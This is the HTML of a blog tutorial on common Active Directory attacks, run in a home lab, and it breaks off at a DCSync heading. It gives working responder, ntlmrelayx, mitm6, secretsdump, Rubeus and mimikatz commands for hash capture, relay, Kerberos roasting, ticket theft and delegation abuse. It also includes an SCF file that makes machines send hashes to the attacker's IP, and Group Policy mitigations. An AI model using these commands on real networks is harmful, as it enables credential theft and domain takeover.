@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>A Quick Shot into Active Directory Attacks</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>A Quick Shot into Active Directory Attacks | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="A Quick Shot into Active Directory Attacks" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This blog is no meant to be a complete description about all the attacks showed, but a quick look into the common attacks in Active Directory environments and how to prevent them, if you want to get a deep understanding about the vulnerabilities please check the links at the end of this blog. The laboratory used is the one that I’m showing on the next image, which consist of a domain controler and two clients. I suggest you that you put the domain controler inside you resolv.conf file or add every machine on the domain with its corresponding fqdn name on the hosts file, some tools can give you problems if you don’t do that." />
+<meta property="og:description" content="This blog is no meant to be a complete description about all the attacks showed, but a quick look into the common attacks in Active Directory environments and how to prevent them, if you want to get a deep understanding about the vulnerabilities please check the links at the end of this blog. The laboratory used is the one that I’m showing on the next image, which consist of a domain controler and two clients. I suggest you that you put the domain controler inside you resolv.conf file or add every machine on the domain with its corresponding fqdn name on the hosts file, some tools can give you problems if you don’t do that." />
+<link rel="canonical" href="http://localhost:8000/Active-Directory-Attacks" />
+<meta property="og:url" content="http://localhost:8000/Active-Directory-Attacks" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/active-directory/Windows-Logo.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-30T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/active-directory/Windows-Logo.png" />
+<meta property="twitter:title" content="A Quick Shot into Active Directory Attacks" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-05-30T00:00:00-05:00","datePublished":"2021-05-30T00:00:00-05:00","description":"This blog is no meant to be a complete description about all the attacks showed, but a quick look into the common attacks in Active Directory environments and how to prevent them, if you want to get a deep understanding about the vulnerabilities please check the links at the end of this blog. The laboratory used is the one that I’m showing on the next image, which consist of a domain controler and two clients. I suggest you that you put the domain controler inside you resolv.conf file or add every machine on the domain with its corresponding fqdn name on the hosts file, some tools can give you problems if you don’t do that.","headline":"A Quick Shot into Active Directory Attacks","image":"http://localhost:8000/assets/images/active-directory/Windows-Logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Active-Directory-Attacks"},"url":"http://localhost:8000/Active-Directory-Attacks"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <h2>A Quick Shot into Active Directory Attacks</h2>
+  <time datetime="2021-05-30T00:00:00-05:00" class="by-line">30 May 2021</time>
+  <p>This blog is no meant to be a complete description about all the attacks showed, but a quick look into the common attacks in Active Directory environments and how to prevent them, if you want to get a deep understanding about the vulnerabilities please check the links at the end of this blog.
+The laboratory used is the one that I’m showing on the next image, which consist of a domain controler and two clients. I suggest you that you put the domain controler inside you resolv.conf file or add every machine on the domain with its corresponding fqdn name on the hosts file, some tools can give you problems if you don’t do that.</p>
+
+<p><img src="/assets/images/active-directory/domain.png" alt="" /></p>
+
+<h2 id="list-of-attacks">List of attacks</h2>
+
+<ul>
+  <li>LLMNR Poisoning</li>
+  <li>Uploading Files on Machines</li>
+  <li>SMB Relay</li>
+  <li>NTLM Relay to Ldap</li>
+  <li>Overpass the Hash</li>
+  <li>AS-REP Roastinng</li>
+  <li>Kerberoasting</li>
+  <li>Unconstrained Delegation</li>
+  <li>Pass the Ticket</li>
+  <li>Constrained Delegation</li>
+  <li>Silver Ticket</li>
+  <li>Golden Ticket</li>
+  <li>Skeleton Key</li>
+</ul>
+
+<h1 id="llmnr-poisoning">LLMNR Poisoning</h1>
+
+<p>When a machine tries to access to a resource that is not found among the available machines on the network a broadcast message is sent asking if anyone knows where that resource is, this is most likely happening when people is just arriving to work and not all machine have been powered on, so if there is any automatic task that tries to access a machine that is powered off it will send the broadcast message, or if any user trying to access to a shared resource makes a typo.</p>
+
+<h3 id="explotation">Explotation</h3>
+
+<p>To exploit this we just need to use responder, with the default configuration file with the next arguments:
+<code class="language-plaintext highlighter-rouge">responder -I &lt;network interface&gt; -rdwv</code></p>
+
+<p>Using any user on the laboratory try to access to a resource that is not available on the network.</p>
+
+<p><img src="/assets/images/active-directory/printer.png" alt="" /></p>
+
+<p>When that happens the broadcast message is sent, we catch it and answer to it like we where the resource, and then the machine will send us his NTLMv2 hash, we can try to crack that hash using hashcat or john, if the password policy of the company is strong we won’t be able to do anything with the hash, but if not we will be able to get the password of the user.</p>
+
+<p><img src="/assets/images/active-directory/ntlmv2hash.png" alt="" /></p>
+
+<h3 id="mitigation">Mitigation</h3>
+
+<p>LLMR is a really old protocol, is we don’t have any really old system that requires it we can disable it through Groups Policies, it is located at <code class="language-plaintext highlighter-rouge">Local Computer Policy -&gt; Computer Configuration -&gt; Administrative Templates -&gt; Network -&gt; DNS Client -&gt; Turn Off Multicast Name Resolution</code></p>
+
+<p><img src="/assets/images/active-directory/netbios_poisoning.png" alt="" /></p>
+
+<p>But that’s not enough, since NetBios also does the same work, so we need to disable it, there is no way of doing this through GPO, so we need to do it locally on every machine, to do so we go to TCP/IPv4 configuration like we would do if we want to set a static IP, go to advanced -&gt; WINS -&gt; Disable NetBIOS, yeah this would be impossible on a big company, so you can automate this with some scripts on powershell, you can look up for them on internet, another option is using the DHCP server to disable it, here we don’t have control over the DHCP server so we do it manually.</p>
+
+<p><strong>Important: If you built your network with NetBIOS as its foundation this can heavily break it, be sure that you know what will happen if you disable NetBIOS and LLMNR</strong>, if you can’t do it, you will have to “live with the <em>vulnerability</em>”, remember security is not about plugin out the wire, if your password policy is good there won’t be any problem with attackers getting the hash if they can’t break it.</p>
+
+<h3 id="attacker-point-of-view">Attacker Point of View</h3>
+
+<p>How do I know that those features where disable and I’m loosing my time? If you scan the network you will see that NetBIOS port (139) is not in the list of the open ports, also nbtscan, nmblookup (or nbtstat if you have access to a windows machine) will get you an empty reply. LLMNR is harder to recognize since there isn’t a TCP port dedicated to it, so if we see that NetBIOS is disabled and we don’t get anything on responder we should change our approach.</p>
+
+<p>NetBIOS enabled:</p>
+
+<p><img src="/assets/images/active-directory/nbt_open.png" alt="" /></p>
+
+<p>NetBIOS disabled:</p>
+
+<p><img src="/assets/images/active-directory/nbt_close.png" alt="" /></p>
+
+<h1 id="uploading-files-on-machines">Uploading Files on Machines</h1>
+
+<p>Now there shouldn’t be a way of machine authenticating agains attackers, right? Well no, let’s scan the network with crackmapexec as a guest account to see if we find anything interesting (this is not the only way of using a guest/null account, and some tools can or cannot give you the same result, so I recomend always use smbmap and smbclient, if you can’t get results with on tool, also try as many combinations of user password as you can think for this kind of accounts).
+<code class="language-plaintext highlighter-rouge">crackmapexec smb 192.168.56.0/24 -u guest -p "" --shares</code></p>
+
+<p><img src="/assets/images/active-directory/crackmap_scan.png" alt="" /></p>
+
+<p>There we see something interesing, on FUSION machine there is a shared folder where everyone can write to, so we can try to abuse this.</p>
+
+<h2 id="scf-files">SCF Files</h2>
+
+<p>There is something called SCF (Shell Command Files) files, theese kind of files allow us to perform a limited set of actions on the machine, what we can do with this is to make the computer access to a network location searching for the icon that should be displayed with the file, if LLMNR of NetBIOS were enabled we could set a random location and we would catch the user hash due to its mechanism, but now that they are disable we can use it to point to us, and with that get a hash, so let’s put a file called “SCFtest.scf” into the shared folder with the next content.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
+Command=2
+IconFile=\\192.168.56.130\share\imaicon.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre></div></div>
+
+<p>Now if a user browses the directory where the file is located on windows explorer, his machine will try to retrieve the icon from our machine, and we will get the hash of the user.</p>
+
+<p><img src="/assets/images/active-directory/scf_file.png" alt="" /></p>
+
+<p>There is a problem, this seems somewhat patched to this day, and on my tests only Windows Servers (2016 and 2019) try to retrieve the icon, it doesn’t work with the clients, so we’ll have to change our approach.</p>
+
+<h2 id="lnk-url-searchconnector-ms-and-library-ms-files">LNK, URL, searchConnector-ms and library-ms files</h2>
+
+<p>SCF is the most known file that does that connection to us, but actually there are other files that do the same work, <a href="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/">here</a> is a blog which explains in detail all these files, also it leaves some <a href="https://github.com/mdsecactivebreach/Farmer">tools</a> to abuse them, those tools where made to work on windows, so you need either compromise a box first to use them, or use a windows machine (this is on part mandatory since first you’ll have to compile the tools), so to avoid that I made <a href="https://github.com/5ubterranean/Seed-Dispenser">two scripts</a> to do only the part of generating the files, so we only need to generate any of the files and upload it to the machine, on this case I generated a library-ms file.</p>
+
+<p><img src="/assets/images/active-directory/put_seed.png" alt="" /></p>
+
+<p>And when a machine opens the folder containing that file we get the hash on responder.</p>
+
+<p><img src="/assets/images/active-directory/responder_seed.png" alt="" /></p>
+
+<h3 id="mitigation-1">Mitigation</h3>
+
+<p>We can disable the load of thumbnails, to do so we have to enable the GPOs “Turno off the display of thumbnails and only display icons on network folders” and “Turn off the display of thumbnails and only display icons”, you can find them at User configuration -&gt; Policies -&gt; Administrative Templates -&gt; Windows components -&gt; File Explorer. Anyways these are not the only ways of making a client access to our machine, and some methods can appear according to our environment, so getting the hashes harvested is just matter of time.</p>
+
+<h1 id="smb-relay">SMB Relay</h1>
+
+<p><img src="/assets/images/active-directory/ilied.png" alt="" /></p>
+
+<p>I said that if the passwords are strong enough attackers won’t be able to do any harm with them right?, well actually you don’t need to crack the hashes to make use of them, there is technique called “SMB Relay” which, as its name says, relays the information, we can make use of any hash that has arrived to our machine to perform a couple of actions in behalf of the user that send his hash, this is possible due to SMB signing not being required by default on the domain clients only on the DC, to make a quick list of machines vulnerable to relaying the hash we can use crackmapexec with the flag <code class="language-plaintext highlighter-rouge">--gen-relay-list</code></p>
+
+<p><img src="/assets/images/active-directory/gen_relay.png" alt="" /></p>
+
+<h3 id="explotation-1">Explotation</h3>
+
+<p>To exploit this missconfiguration we will use responder again, but first we have to edit its config file and disable SMB, and HTTP, since those services will be managed by another tool, now we execute the next commands of different terminals.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -I &lt;interface&gt; -rdwv
+ntlmrelayx.py -tf targets.txt -smb2support
+</code></pre></div></div>
+
+<p>This is the default setting, if LLMNR or NetBIOS would be enabled responder would poisong the network and we would get the NTLMv2 hash through SMB, but on this scenario those two are disabled and we’re getting a request directly due a file icon, so we don’t need to use responder, now if we get the hash of any user who has administrative privileges on any machine on the domain we will dump the SAM of that machine.</p>
+
+<p><img src="/assets/images/active-directory/smb_relay.png" alt="" /></p>
+
+<p>The output of ntlmrelayx can be very noisy, anyways by default it saves what matters on a file located on the directory where it was ran.</p>
+
+<p><img src="/assets/images/active-directory/samdump.png" alt="" /></p>
+
+<p>Take into account that you cannot relay to the same machine where you got the hash from, for example if you get the hash of administrator comming from the DC, even if SMB signing where disabled you wouldn’t be able to dump the SAM of the DC. There are some options that are worth mentioning:</p>
+
+<ul>
+  <li>-i starts an interactive SMB sessions using the relayed credentials which you can access with nc through the given port (default 11000)</li>
+  <li>-e executes a file when you get valid credentials</li>
+  <li>-c executes a command when you get valid credentials</li>
+  <li>-socks starts a socks4 proxy on port 1080, any action that you perform using that proxy will use the catched credential, you can combine a lot of tools with proxychain, specially usefull with crackmapexec, you can use any password since it will use the catched credential</li>
+</ul>
+
+<h3 id="mitigation-2">Mitigation</h3>
+
+<p>Enable SMB signing on <strong>all</strong> the domain, to do that we have to enable two GPOs, “Microsoft network server: Digitally sign communications (always)” and “Microsoft network client: Digitally sign communications (always)”, both are located at: Computer Configuration -&gt; Policies -&gt; Windows Settings -&gt; Security Settings -&gt; Local Policies -&gt; Security Options, once the GPO is in place all the machines will require signing the SMB connections.</p>
+
+<p><img src="/assets/images/active-directory/signed.png" alt="" /></p>
+
+<h1 id="ntlm-relay-to-ldap">NTLM Relay to Ldap</h1>
+
+<p>Now we can’t relay to SMB, but SMB is not the only protocol that can be used with NTLM credentials, another protocol that comes in active directory is Ldap, and let’s not forget about HTTP, also let’s add IPv6, which is enabled by default on windows by still until today hardly used, so here we will chain a couple of things, act as a IPv6 DHCP server, so our machine is set as the default DNS on the network machines, when someone tries to browse internet set a WPAD config file that will set us as a web proxy, as a proxy ask for NTLM authentication so we can get the credentials over HTTP, finally having the credentials relay them to Ldap, we can’t use the above methods to relay to ldap since it’s not possible to do it from SMB to Ldap, if you want to understand better this attacks I suggest you reading the <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">mitm6 blog</a>, and this blog about <a href="https://en.hackndo.com/ntlm-relay/">what can be relayed</a>, also on 2019 was found a way to relay from SMB to Ldap, this vulnerability was called “drop the mic”, but since it’s already patched I’ll not discuss it.
+Getting back at the attack we only need to use two commands to perform this attack:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitm6 -d &lt;domain&gt; -i &lt;interface&gt;
+ntlmrelayx.py -6 -t ldap://&lt;DC IP&gt; -l ldump -wh &lt;any value&gt;.&lt;domain&gt;
+</code></pre></div></div>
+
+<p>As we saw earlier by default ntlmrelayx dumps the info to the current directory, but we can use <code class="language-plaintext highlighter-rouge">-l</code> to set another directory where the info will go, there are 2 situations that will trigger the attack:</p>
+
+<ol>
+  <li>A client starts up or get reboted</li>
+  <li>Automatically around every 30 minutes</li>
+</ol>
+
+<p>On any on those cases a client inside the network will try to authenticate against us and the attack will fire up.</p>
+
+<p><img src="/assets/images/active-directory/ntlm_ldap.png" alt="" /></p>
+
+<p>By default the tool will dump all the information from ldap and will save it on different files just like <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a> would do.</p>
+
+<p><img src="/assets/images/active-directory/ldap_dump.png" alt="" /></p>
+
+<h2 id="escalating-user">Escalating user</h2>
+
+<p>That’s it? Any user on the domain can query ldap, so there is no way of getting anything useful from it, rigth? Well that’s true for normal users, but if we get the hash of an administrator everything changes, if we can get access to any user on the domain, we can elevate his privileges so he can DCSync the domain, if we are able to do that we basically own the domain, to do that we use the flag <code class="language-plaintext highlighter-rouge">--escalate-user</code>, so what we need to do is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitm6 -d &lt;domain&gt; -i &lt;interface&gt;
+ntlmrelayx.py -6 -t ldap://&lt;DC IP&gt; -wh &lt;any value&gt;.&lt;domain&gt; --no-dump --escalate-user &lt;username&gt;
+</code></pre></div></div>
+
+<p>After that we can run <code class="language-plaintext highlighter-rouge">secretsdump.py &lt;user&gt;:&lt;password&gt;@&lt;DC&gt;</code> to dump all the domain hashes, on this case the output of ntlmrelay in even more noisy, so I recommend using tee to save the out to another file, this is even more useful on the next attack, since dealing with the output is bothersome I made a <a href="https://github.com/5ubterranean/Random-Scripts/blob/main/ntlm-to-ldap/ntlm-to-ldap.sh">small script</a> that automates everything, so let’s say I was able to get the password of the user yfudo, Password2, using my script I would run: <code class="language-plaintext highlighter-rouge">./ntlm-to-ldap.sh -m escalate -d KAIBA-CORP.local -i eth1 -n KAIBA-CORP-DC.KAIBA-CORP.local -t 192.168.56.18 -u yfudo -p Password2</code>, and when an administrator logs in a machine on the network we will get:</p>
+
+<p><img src="/assets/images/active-directory/dcsync.png" alt="" /></p>
+
+<p>What the attack does is modify the ACLs so we can add a user to a group, on this case we add it to “Enterprise Admins” give it rights to perform DCSync and then clean those ACLs, after the script is done we can still perform DCSync with the given user, but it won’t have any extra privileges on the domain.</p>
+
+<h1 id="ntlm-relay-to-ldaps">NTLM Relay to Ldaps</h1>
+
+<p>We are always told to change to more secure protocol, so what about Ldaps?, first we need to verify that it is configured on the DC, to do it we can run the next command: <code class="language-plaintext highlighter-rouge">openssl s_client -connect &lt;DC IP&gt;:636 -showcerts &lt; /dev/null</code> If it’s not configured we will get the next output:</p>
+
+<p><img src="/assets/images/active-directory/ldaps_disabled.png" alt="" /></p>
+
+<p>If you don’t have Ldaps configured you can do it by going to , Manage -&gt; Add Roles and Features -&gt; Next -&gt; Role-Based or feature… -&gt; Select Server from the server pool -&gt; Check “Active Directory Certificate Service” -&gt; next -&gt; Next -&gt; Next -&gt; Install. When it’s done click on “Configure Active Directory Certificate…” on the warning sign.</p>
+
+<p><img src="/assets/images/active-directory/wsign.png" alt="" /></p>
+
+<p>On Role Service Check “Certification Authority” and leave everything else by dafult. After rebooting the server we will see that now it gives us a certificate.</p>
+
+<p><img src="/assets/images/active-directory/ldaps_enabled.png" alt="" /></p>
+
+<p>Now we can perform something even more powerful that what we did with ldap, since with ldaps we can create a new user, so now we don’t need any valid credentials inside the domain we can create our own user, give him DCSync rights and dump everything, to do so we change the target from ldap to ldaps, and erase “–escalate-user”, so we have <code class="language-plaintext highlighter-rouge">ntlmrelayx.py -6 -t ldaps://&lt;DC IP&gt; -wh &lt;any value&gt;.&lt;domain&gt; --no-dump</code>, using my script I would run: <code class="language-plaintext highlighter-rouge">./ntlm-to-ldap.sh -m add -d KAIBA-CORP.local -i eth1 -n KAIBA-CORP-DC.KAIBA-CORP.local -t 192.168.56.18</code>, and when an administrator logs in a machine on the network we will get:</p>
+
+<p><img src="/assets/images/active-directory/add_dcsync.png" alt="" /></p>
+
+<p>On this case we won’t be able to perform a DCSync after we clean the ACLs, but the added user will persist on the domain.</p>
+
+<h3 id="mitigation-3">Mitigation</h3>
+
+<ol>
+  <li>If you don’t use IPv6 on your network you can disable it, since the idea is to migrate to IPv6 this is discouraged, you can block DHCPv6 inbound and outbound on windows firewall and Inbound Core Networking - Router Advertisement (ICMPv6-in).</li>
+  <li>We used WPAD to set ourselves as a proxy, if you don’t use WPAD disable the service WinHTTPAutoProxySvc.</li>
+  <li>Enable LDAP signing <strong>AND</strong> LDAP channel binding.</li>
+</ol>
+
+<h1 id="overpass-the-hash">Overpass the Hash</h1>
+
+<p>We can use NTLM hashes to authenticate against kerberos, getting access to the corresponding account without knowing the password, the LM part of the hash is usually empty, so we can put “:” at the start without nothing before to avoid parse issues.</p>
+
+<p><img src="/assets/images/active-directory/opth.png" alt="" /></p>
+
+<h1 id="as-rep-roastinng">AS-REP Roastinng</h1>
+
+<p>AS-REP Roasting happens when a user has set “do not require Keberos preauthentication”, we can request a hash from those account without having any information besides the account name, if we were able to query ldap through ldapsearch we can look for the value “userAccountControl”, if that value exceeds 4194304, but is lower than 8000000, it means that it doesn’t require Kerberos preauthentication, <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">here</a> is a list to find out what means the value that you get, on this case we run <code class="language-plaintext highlighter-rouge">ldapsearch -x -h 192.168.56.18 -D yfudo@KAIBA-CORP.local -w Password2 -b "DC=KAIBA-CORP,DC=local" "(userAccountControl&gt;=4000000)"</code>, and <a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">here</a> you can find a powershell script that will return the properties of the account if you give it the userAccountControl number, on this case we find SVC-SQL user, which I set do not require Kerberos preauthentication on the DC.</p>
+
+<p><img src="/assets/images/active-directory/ldapsearch.png" alt="" /></p>
+
+<p>If we are inside a box that belongs to the domain we can load PowerView and run “Get-Domainuser -PreAuthNotRequired”, to find which users are vulnerable to AS-REP roasting.</p>
+
+<p><img src="/assets/images/active-directory/powerasrep.png" alt="" /></p>
+
+<h2 id="explotation-2">Explotation</h2>
+
+<h3 id="impacket">Impacket</h3>
+
+<p>To exploit the account we can use GetNPUsers from impacket, on this case we run <code class="language-plaintext highlighter-rouge">GetNPUsers.py KAIBA-CORP.local/SVC-SQL -no-pass</code>, we can target multiple users instead of just one in case we get a list of users but are not able to validate if they are vulnerable.</p>
+
+<p><img src="/assets/images/active-directory/getnpusers.png" alt="" /></p>
+
+<h3 id="rubeus">Rubeus</h3>
+
+<p>If we want to run it from a machine inside the machine we can use Rubeus, on this case we run <code class="language-plaintext highlighter-rouge">Rubeus.exe asreproast /user:SVC-SQL /domain:KAIBA-CORP.local</code>.</p>
+
+<p><img src="/assets/images/active-directory/rubeusasrep.png" alt="" /></p>
+
+<p>Now we can use John of hashcat to crack that hash.</p>
+
+<h1 id="kerberoasting">Kerberoasting</h1>
+
+<p>Service accounts can requiere to be set as SPNs, any user can request a ticket from an account set like that, so to abuse any spn account we need valid credentials or access to a machine inside the domain, with powerview we can use the command “Get-NetUser -SPN”, to find if there is any spn account on the domain.</p>
+
+<h3 id="impacket-1">Impacket</h3>
+
+<p>To exploit the account we can use GetUserSPNs from impacket, on this case we run <code class="language-plaintext highlighter-rouge">GetUserSPNs.py -request-user SVC-SQL KAIBA-CORP.local/yfudo:Password2</code>.</p>
+
+<p><img src="/assets/images/active-directory/getuserspns.png" alt="" /></p>
+
+<h3 id="rubeus-1">Rubeus</h3>
+
+<p>With Rubeus we use <code class="language-plaintext highlighter-rouge">Rubeus.exe kerberoast /user:SVC-SQL /domain:KAIBA-CORP.local</code>.</p>
+
+<p><img src="/assets/images/active-directory/rubeuskerb.png" alt="" /></p>
+
+<h1 id="unconstrained-delegation">Unconstrained Delegation</h1>
+
+<p>Let’s say we need a machine to be able to act in our behalf after we have authenticated with it, well there is something called delegation, for this scenario we have to set “trust this computer for delegation to any service”, and this will allow the computer act in behalf of any user who has authenticated with it, this happens because when a user authenticates to this machine it TGT gets stored in memory so it can be reused, well we can dump that ticket from memory, and use a technique called pass the ticket to act like we where that user. Again it is possible to find accounts with that option enabled with ldapsearch, on this case the value for that option is 524288, so using ldapsearch we search for account with a value greater than 500000, and let’s filter to only get the account name and the account control number: <code class="language-plaintext highlighter-rouge">ldapsearch -x -h 192.168.56.18 -D yfudo@KAIBA-CORP.local -w Password2 -b "DC=KAIBA-CORP,DC=local" "(userAccountControl&gt;=500000)" | grep 'sAMAccountName\|userAccountControl'</code></p>
+
+<p><img src="/assets/images/active-directory/ldapsearch_kerbe.png" alt="" /></p>
+
+<p>The DC has this by default so we don’t need it, so we have FUSION$ and SVC-SQL again, it had not require preauthentication, which is a greater number, so it could have also delegation set, using the PS script we see that it doesn’t have uncontrained delegation option.</p>
+
+<p><img src="/assets/images/active-directory/ps_unconstrained.png" alt="" /></p>
+
+<p>Using PowerView we can run <code class="language-plaintext highlighter-rouge">Get-NetComputer -UnConstrained</code></p>
+
+<p><img src="/assets/images/active-directory/poweruncon.png" alt="" /></p>
+
+<p>Also we can use ActiveDirectory module to avoid loading any external script and using a script to interpret ldap output.</p>
+
+<p><img src="/assets/images/active-directory/adunc.png" alt="" /></p>
+
+<h2 id="explotation-3">Explotation</h2>
+
+<p>To exploit this wee need that a user access to a service on this machine (opening a share folder will do it), so we can wait to that happen or improve our chances usings the special files but poiting to the machine which has unconstrained delegation set, also we will need to have administrative privileges on this machine.</p>
+
+<h3 id="rubeus-2">Rubeus</h3>
+
+<p>We can use Rubeus to monitor for a TGT coming to the machine, also if we want to hunt for a specific user we can filter it, so we use <code class="language-plaintext highlighter-rouge">Rubeus.exe monitor /interval:5 /filteruser:administrator /nowrap</code></p>
+
+<p><img src="/assets/images/active-directory/rubeus_monitor.png" alt="" /></p>
+
+<p>If we want to look for tickets that already are in memory we can use “Rubeus.exe triage”</p>
+
+<p><img src="/assets/images/active-directory/rubeus_uncontri.png" alt="" /></p>
+
+<p>So we can dump it with the dump option, <code class="language-plaintext highlighter-rouge">Rubeus.exe dump /user:Administrator /nowrap</code></p>
+
+<p><img src="/assets/images/active-directory/rubeus_dumpun.png" alt="" /></p>
+
+<h3 id="mimikatz">Mimikatz</h3>
+
+<p>We can dump all the tickets with mimikatz, on this case we run <code class="language-plaintext highlighter-rouge">mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"</code>, now if we list the tickets we will find the TGT of administrator.</p>
+
+<p><img src="/assets/images/active-directory/mimikatz_uncon.png" alt="" /></p>
+
+<h1 id="pass-the-ticket">Pass the Ticket</h1>
+
+<p>Nice we got some base64 strings and some .kirbi files, but what we can do with them?, we can do something called pass the ticket, what will do is use the ticket that we got to perform all our actions, and since we got a ticket from administrator we can do anything on the domain, we don’t need any privileges to load a ticket on our current session.</p>
+
+<h3 id="mimikatz-1">Mimikatz</h3>
+
+<p>Using mimikatz we execute <code class="language-plaintext highlighter-rouge">mimikatz.exe "kerberos::ptt &lt;path to ticket .kirbi file&gt;" "exit"</code>, and after that we will act in behalf of administrator.</p>
+
+<p><img src="/assets/images/active-directory/mimikatz_ptt.png" alt="" /></p>
+
+<h3 id="rubeus-3">Rubeus</h3>
+
+<p>Using Rubeus we execute <code class="language-plaintext highlighter-rouge">Rubeus.exe ptt /ticket:&lt;base64 ticket&gt;</code>, and we will act in behalf of administrator, you can put a file to a .kirbi ticket instead of the base64 string.</p>
+
+<p><img src="/assets/images/active-directory/rubeus_ptt.png" alt="" /></p>
+
+<h3 id="impacket-2">Impacket</h3>
+
+<p>We can also use the ticket with impacket tools, but we need some steps to do it, we can download the file exported by mimikatz or copy the base64 string that Rubeus generated, decode and save it to a .kirbi file, using tickerConverter we convert the .kirbi to a .ccache file, then we have to export an eviroment variable named “KRB5CCNAME” that points to the absolute path of the .ccache ticket, with that we can run any impacket tool that support the options -k and -n (or -no-pass).</p>
+
+<p><img src="/assets/images/active-directory/impacket_ptt.png" alt="" /></p>
+
+<h1 id="constrained-delegation">Constrained Delegation</h1>
+
+<p>Constrained delegation gives an account rights to act as any account without any consent of such account, but for a specfic service inside a machine, for example here the computer SYNCHRO can access to the service time on FUSION computer.</p>
+
+<p><img src="/assets/images/active-directory/contrained.png" alt="" /></p>
+
+<p>So to abuse this characteristic we need an “useful” service set on this machine? Well that’s not completely true, there is something called “alternative service”, so we can ask access to another service, the problem here is that that service is not validated, and we can actually ask access to <strong>any</strong> service inside that machine, so if we get control of an account with constrained delegation set we own any machine on which this machine has rights to ask for a service. To find if there is any computer or user that has constrained delegation set we can use PowerView functions, <code class="language-plaintext highlighter-rouge">Get-DomainUser -TrustedToAuth</code> and <code class="language-plaintext highlighter-rouge">Get-DomainComputer -TrustedToAuth</code>.</p>
+
+<p><img src="/assets/images/active-directory/powercons.png" alt="" /></p>
+
+<p>Here we find that SYNCHRO computer has the right to use “time” service on <code class="language-plaintext highlighter-rouge">FUSION</code>.</p>
+
+<h2 id="explotation-4">Explotation</h2>
+
+<p>To abuse this set up we need an elevated shell on SYNCHRO$ machine, the delegation right is to set to SYNCHRO$ so we need to act as that account, using Rubeus we check what tickets are available.</p>
+
+<p><img src="/assets/images/active-directory/synchro_ticket.png" alt="" /></p>
+
+<p>The ticket that we want is for the service “krbtgt”, so we run <code class="language-plaintext highlighter-rouge">Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap</code> to dump it, you can use “/outfile:<ticketname.kirbi>" to save it to a file.</ticketname.kirbi></p>
+
+<p><img src="/assets/images/active-directory/synchro_tgt.png" alt="" /></p>
+
+<p>Now to ask for a tgs impersonting an account inside FUSION$ we run <code class="language-plaintext highlighter-rouge">Rubeus.exe s4u /ticket:&lt;ticket&gt; /msdsspn:&lt;service&gt;/&lt;machine&gt; /impersonateuser:&lt;user to impersonate&gt;</code>, if we want an alternate service we add the flag <code class="language-plaintext highlighter-rouge">/altservice:&lt;service&gt;</code>, also if we want to performa a pass the ticket we add <code class="language-plaintext highlighter-rouge">/ptt</code>, so we run here <code class="language-plaintext highlighter-rouge">Rubeus.exe s4u /ticket:&lt;base64 ticket&gt; /impersonateuser:administrator /msdsspn:time/FUSION /altservice:host /ptt</code>, you will see Rubeus doing the work, and at the end the message “[+] Ticket successfully imported!”.</p>
+
+<p><img src="/assets/images/active-directory/rubeus_s4u.png" alt="" /></p>
+
+<p>Now the question is, why did I used host service? Well besides other stuff host allows us to schedule tasks on a machine, so if we run <code class="language-plaintext highlighter-rouge">schtasks /create /s &lt;computername&gt; /tn "&lt;task name&gt;" /tr &lt;command&gt;</code>, we can schedule a task on the machine that we have the ticket for, on this case we schedule the usual download and execute on powershell.</p>
+
+<p><img src="/assets/images/active-directory/schpow.png" alt="" /></p>
+
+<p>We specified it to run every minute, “/ru system” sets it to run as system, this is the default user, but if we don’t set it it will only run if the user is logged in, so to avoid that we have to set it, after waiting a minute we get a shell on FUSION as system.</p>
+
+<p><img src="/assets/images/active-directory/fusshell.png" alt="" /></p>
+
+<p>Using the textplain powershell command on schedule tasks is pretty easy to catch, is up to the reader find stelathier ways of using this approach, the schtasks command has a limit size for the command, so using <code class="language-plaintext highlighter-rouge">"echo -n '&lt;command&gt;' | iconv -f UTF8 -t UTF16LE | base64 -w 0"</code> to get an encoded command is not the best option.</p>
+
+<h3 id="dcsync">DCSync</h3>
+
